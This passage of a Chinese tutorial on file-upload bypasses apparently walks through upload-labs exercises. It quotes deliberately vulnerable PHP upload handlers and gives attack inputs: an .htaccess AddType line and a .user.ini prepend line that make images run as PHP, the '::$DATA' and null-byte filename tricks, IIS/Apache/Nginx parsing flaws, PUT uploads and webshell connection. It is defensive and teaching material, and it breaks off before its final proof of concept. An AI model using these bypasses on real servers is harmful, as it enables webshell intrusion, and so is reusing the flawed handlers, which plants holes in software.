<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;php&quot;</span>,<span class="string">&quot;php5&quot;</span>,<span class="string">&quot;php4&quot;</span>,<span class="string">&quot;php3&quot;</span>,<span class="string">&quot;php2&quot;</span>,<span class="string">&quot;html&quot;</span>,<span class="string">&quot;htm&quot;</span>,<span class="string">&quot;phtml&quot;</span>,<span class="string">&quot;pht&quot;</span>,<span class="string">&quot;jsp&quot;</span>,<span class="string">&quot;jspa&quot;</span>,<span class="string">&quot;jspx&quot;</span>,<span class="string">&quot;jsw&quot;</span>,<span class="string">&quot;jsv&quot;</span>,<span class="string">&quot;jspf&quot;</span>,<span class="string">&quot;jtml&quot;</span>,<span class="string">&quot;asp&quot;</span>,<span class="string">&quot;aspx&quot;</span>,<span class="string">&quot;asa&quot;</span>,<span class="string">&quot;asax&quot;</span>,<span class="string">&quot;ascx&quot;</span>,<span class="string">&quot;ashx&quot;</span>,<span class="string">&quot;asmx&quot;</span>,<span class="string">&quot;cer&quot;</span>,<span class="string">&quot;swf&quot;</span>,<span class="string">&quot;htaccess&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="variable">$deny_ext</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$file_name</span>);</span><br><span class="line">        <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">        <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$file_name</span>;        </span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="伪静态文件绕过（-htaccess）"><a href="#伪静态文件绕过（-htaccess）" class="headerlink" title="伪静态文件绕过（.htaccess）"></a>伪静态文件绕过（.htaccess）</h4><h5 id="简介-3"><a href="#简介-3" class="headerlink" title="简介"></a>简介</h5><p>.htaccess（Hypertext Access）文件，又称分布式配置文件，提供了针对目录改变配置的方法， 即在一个特定的文档目录中放置一个包含一个或多个指令的文件， 以作用于此目录及其所有子目录。作为用户，所能使用的命令受到限制。管理员可以通过Apache的<strong>AllowOverride</strong>指令来设置。</p>
<p>.htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过.htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许&#x2F;阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。</p>
<p>启用.htaccess，需要修改httpd.conf，启用<strong>AllowOverride</strong>，并可以用<strong>AllowOverride</strong>限制特定命令的使用。如果需要使用.htaccess以外的其他文件名，可以用AccessFileName指令来改变。例如，需要使用.config ，则可以在服务器配置文件中按以下方法配置：AccessFileName .config 。</p>
<p>通常，在文件上传有严格的后缀名黑名单限制但除了.htaccess外，我们可以利用上传.htaccess文件修改上传文件所在目录的配置、令其解析任意后缀名文件为目标后缀名文件如php，从而绕过黑名单过滤。</p>
<h5 id="参考案例（Upload-Lab-Pass-04）"><a href="#参考案例（Upload-Lab-Pass-04）" class="headerlink" title="参考案例（Upload_Lab_Pass_04）"></a>参考案例（Upload_Lab_Pass_04）</h5><p>新建一个.htaccess文件，参考如下，并上传。</p>
<p><code>AddType application/x-httpd-php shell.jpg</code></p>
<p><img src="http://img.yichen.cf/learning_upload/20220310112453.png"></p>
<p>在上传一个shell.jpg，结果参考如下，并使用蚁剑进行连接</p>
<p><img src="http://img.yichen.cf/learning_upload/20220310112547.png"></p>
<p><img src="http://img.yichen.cf/learning_upload/20220310112601.png"></p>
<h6 id="代码分析-2"><a href="#代码分析-2" class="headerlink" title="代码分析"></a>代码分析</h6><p>通过array对文件名后缀进行校验，也就是黑名单校验。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;php1&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;pHp1&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">deldot</span>(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strrchr</span>(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$file_ext</span>); <span class="comment">//收尾去空</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="title function_ invoke__">rand</span>(<span class="number">1000</span>,<span class="number">9999</span>).<span class="variable">$file_ext</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;此文件不允许上传!&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="利用Windows操作系统的特性绕过"><a href="#利用Windows操作系统的特性绕过" class="headerlink" title="利用Windows操作系统的特性绕过"></a>利用Windows操作系统的特性绕过</h4><h5 id="简介-4"><a href="#简介-4" class="headerlink" title="简介"></a>简介</h5><p>在window的时候如果文件名+”<code>::$DATA</code>“会把<code>::$DATA</code>之后的数据当成文件流处理,不会检测后缀名，且保持<code>::$DATA</code>之前的文件名，他的目的就是不检查后缀名</p>
<p>例如:”<code>phpinfo.php::$DATA</code>“Windows会自动去掉末尾的<code>::$DATA</code>变成”<code>phpinfo.php</code>“</p>
<h5 id="参考案例（Upload-Lab-Pass-08）"><a href="#参考案例（Upload-Lab-Pass-08）" class="headerlink" title="参考案例（Upload_Lab_Pass_08）"></a>参考案例（Upload_Lab_Pass_08）</h5><p>利用Windows文件流特性绕过，直接在.php后缀名后面加上空格拼接的字符串“ ::$DATA”即可。</p>
<p>上抓文件并抓包</p>
<p><img src="http://img.yichen.cf/upload_chshi/windows%E4%B8%8B%E5%91%BD%E5%90%8D.png#crop=0&crop=0&crop=1&crop=1&id=rFvNZ&originHeight=689&originWidth=1755&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="></p>
<p>发现返回包上传成功，连接蚁剑</p>
<p><img src="http://img.yichen.cf/upload_chshi/windows%E4%B8%8B%E5%91%BD%E5%90%8D2.png#crop=0&crop=0&crop=1&crop=1&id=ZLhRI&originHeight=830&originWidth=1155&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="></p>
<p><img src="http://img.yichen.cf/upload_chshi/windows%E4%B8%8B%E5%91%BD%E5%90%8D3.png#crop=0&crop=0&crop=1&crop=1&id=fsV9I&originHeight=999&originWidth=1542&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="></p>
<h6 id="代码分析-3"><a href="#代码分析-3" class="headerlink" title="代码分析"></a>代码分析</h6><p>后端程序使用黑名单过滤大部分文件后缀名，但未过滤字符串“<code>::$DATA</code>”。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">deldot</span>(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strrchr</span>(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$file_ext</span>); <span class="comment">//首尾去空</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="title function_ invoke__">rand</span>(<span class="number">1000</span>,<span class="number">9999</span>).<span class="variable">$file_ext</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;此文件类型不允许上传！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="白名单校验"><a href="#白名单校验" class="headerlink" title="白名单校验"></a>白名单校验</h3><h4 id="00截断"><a href="#00截断" class="headerlink" title="00截断"></a>00截断</h4><p>若路径可控，则可以使用0x00或%00截断来绕过。</p>
<p>%00截断是用于GET方式中的，而0x00截断则是用于非GET的需要在二进制代码上直接修改的方式如POST</p>
<h5 id="00"><a href="#00" class="headerlink" title="%00"></a>%00</h5><h6 id="参考案例（Upload-Lab-Pass-011）"><a href="#参考案例（Upload-Lab-Pass-011）" class="headerlink" title="参考案例（Upload_Lab_Pass_011）"></a>参考案例（Upload_Lab_Pass_011）</h6><p>可以在save_path参数处使用%00截断，但需要满足下面两个前提条件：</p>
<ul>
<li>PHP版本 &lt; 5.3.4；</li>
<li>PHP的魔术引号即magic_quotes_gpc为Off关闭状态；</li>
</ul>
<p><img src="http://img.yichen.cf/upload_chshi/00%E6%88%AA%E6%96%AD1.png#crop=0&crop=0&crop=1&crop=1&id=GXckG&originHeight=663&originWidth=1664&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="></p>
<p><strong>代码分析</strong></p>
<p>后端程序使用白名单过滤限定文件后缀名只能为jpg&#x2F;png&#x2F;gif，但文件保存路径外部可控</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$ext_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">    <span class="variable">$file_ext</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],<span class="title function_ invoke__">strrpos</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>,<span class="variable">$ext_arr</span>))&#123;</span><br><span class="line">        <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">        <span class="variable">$img_path</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;save_path&#x27;</span>].<span class="string">&quot;/&quot;</span>.<span class="title function_ invoke__">rand</span>(<span class="number">10</span>, <span class="number">99</span>).<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_ext</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>))&#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;只允许上传.jpg|.png|.gif类型文件！&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h5><h6 id="参考案例（Upload-Lab-Pass-012）"><a href="#参考案例（Upload-Lab-Pass-012）" class="headerlink" title="参考案例（Upload_Lab_Pass_012）"></a>参考案例（Upload_Lab_Pass_012）</h6><p>绕过方法是%00相似，就是一个是get请求一个是post请求</p>
<p>手动到Hex解密改有些麻烦，我们可以借助Burp自带的URL解码功能来实现：</p>
<p><img src="http://img.yichen.cf/upload_chshi/00%E6%88%AA%E6%96%AD2.png#crop=0&crop=0&crop=1&crop=1&id=N0zhr&originHeight=715&originWidth=1335&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="></p>
<p><img src="http://img.yichen.cf/upload_chshi/00%E6%88%AA%E6%96%AD3.png#crop=0&crop=0&crop=1&crop=1&id=QVBVw&originHeight=723&originWidth=1726&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="></p>
<p><strong>代码分析</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$ext_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">    <span class="variable">$file_ext</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],<span class="title function_ invoke__">strrpos</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>,<span class="variable">$ext_arr</span>))&#123;</span><br><span class="line">        <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">        <span class="variable">$img_path</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;save_path&#x27;</span>].<span class="string">&quot;/&quot;</span>.<span class="title function_ invoke__">rand</span>(<span class="number">10</span>, <span class="number">99</span>).<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_ext</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>))&#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;上传失败&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;只允许上传.jpg|.png|.gif类型文件！&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="服务器解析漏洞"><a href="#服务器解析漏洞" class="headerlink" title="服务器解析漏洞"></a>服务器解析漏洞</h3><p>解析漏洞主要说的是些特殊文件被iis、apache、nginx在某种情况下解释成脚本文件格式的漏洞</p>
<h4 id="IIS5-X-x2F-6-0解析漏洞"><a href="#IIS5-X-x2F-6-0解析漏洞" class="headerlink" title="IIS5.X&#x2F;6.0解析漏洞"></a>IIS5.X&#x2F;6.0解析漏洞</h4><p>lIS 6.0解析利用方法有两种</p>
<h4 id="目录解析"><a href="#目录解析" class="headerlink" title="目录解析"></a>目录解析</h4><p>*&#x2F;xx. asp&#x2F;xx.jpg在网站下建立文件夹的名字为.asp、.asa 的文件夹，其目录内的任何扩展名的文件都被IIS当作asp文件来解析并执行。例如创建目录getshell.asp,那么&#x2F;getshell.asp&#x2F;1.jpg将被当作asp文件来执行。</p>
<h4 id="文件解析"><a href="#文件解析" class="headerlink" title="文件解析"></a>文件解析</h4><p>getshell.asp;.ipg第二种，在IS6.0下， 分号后面的不被解析，也就是说getshell.asp;jpg会被服务器看成是wooyun.asp还有IIS6.0默认的可执行文件除了asp还包含这三种&#x2F;getshell.asa&#x2F;getshell.cer&#x2F;getshell.cdx</p>
<h4 id="Apache解析漏洞"><a href="#Apache解析漏洞" class="headerlink" title="Apache解析漏洞"></a>Apache解析漏洞</h4><ul>
<li>Apache是从右到左开始判断解析，如果为不可识别解析,就再往左判断.比如getshell.php.owf.rar“ .owf”和”.rar” 这两种后缀是apache不可识别解析,apache就会把getshell.php.owf.rar解析成php. </li>
<li>如何判断是不是合法的后缀就是这个漏洞的利用关键,测试时可以尝试上传一个getshell.php.rara.jpg.png… ( 把你知道的常见后缀都写.上..) 去测试是否是合法后缀 </li>
<li>任意不识别的后缀，逐级向上识别Php&#x2F;sap&#x2F;sapx&#x2F;asaX.php.zzzX.php._</li>
</ul>
<h4 id="利用CGI-x2F-FastCGI-Nginx"><a href="#利用CGI-x2F-FastCGI-Nginx" class="headerlink" title="利用CGI&#x2F;FastCGI(Nginx)"></a>利用CGI&#x2F;FastCGI(Nginx)</h4><p>我们可以，Nginx默认使用CGI的方式，所以可以利用.user.ini文件。我们可以在该文件中修改php.ini中的一些选项，从而进行绕过。构造语句:</p>
<p>auto_ prepend_ file&#x3D;phpinfo.jpg</p>
<p>意思是在加载php文件之前先加载phpinfo.jpg文件，相当于包含了该文件的内容。</p>
<h4 id="IIS-7-0-x2F-IIS-7-5-x2F-Nginx-lt-8-03畸形解析漏洞"><a href="#IIS-7-0-x2F-IIS-7-5-x2F-Nginx-lt-8-03畸形解析漏洞" class="headerlink" title="IIS 7.0&#x2F;IIS 7.5&#x2F;Nginx&lt;8.03畸形解析漏洞"></a>IIS 7.0&#x2F;IIS 7.5&#x2F;Nginx&lt;8.03畸形解析漏洞</h4><p>在默认Fast-CGI开启状况下,上传一个名字为getshell.jpg,内容为’);?&gt;的文件，然后访问getshell.jpg&#x2F;.php,在这个目录下就会生成一句话木马shell.php</p>
<p><a target="_blank" rel="noopener" href="https://www.xx.com/logo.gif/">www.xx.com/logo.gif/</a>*.php触发漏洞(有漏洞会把前面文件当做php执行)</p>
<p>X.asp00jieduan%jpg</p>
<p>a.aspx.a;,a.aspx.jpg. jpg第二种解析漏洞或者直接上传xx.asp</p>
<h3 id="PUT方法"><a href="#PUT方法" class="headerlink" title="PUT方法"></a>PUT方法</h3><h4 id="简介-5"><a href="#简介-5" class="headerlink" title="简介"></a>简介</h4><p>Web容器支持PUT、MOVE、COPY等不安全的HTTP方法，若权限配置不当、系统未禁用这些危险的HTTP方法时，攻击者就可以直接从客户端向服务器上传数据来取代指定文档的内容，即攻击者通过PUT、MOVE、COPY等HTTP方法上传恶意文件。</p>
<p>该漏洞很简单，直接向目标站点的某些接口发送HTTP OPTIONS请求，若正常返回响应，则查看返回响应中允许哪些HTTP方法，若允许PUT、MOVE、COPY等其中的某些方法，则可以发送这些HTTP方法请求进行利用。</p>
<h4 id="参考案例-1"><a href="#参考案例-1" class="headerlink" title="参考案例"></a>参考案例</h4><p>访问一个存在目录遍历的网站，也可以不用目录遍历的，有目录遍历的可以更加清晰的知道自己的文件有没有上传成功。</p>
<p><img src="http://img.yichen.cf/learning_upload/20220310112651.png"></p>
<p>对有怀疑的目标进行测试，执行语句：curl -v -X OPTIONS <a target="_blank" rel="noopener" href="http://url,执行结果参考如下/">http://url,执行结果参考如下</a></p>
<p><img src="http://img.yichen.cf/learning_upload/20220310112703.png"></p>
<p>尝试上传文件，poc参考如下</p>
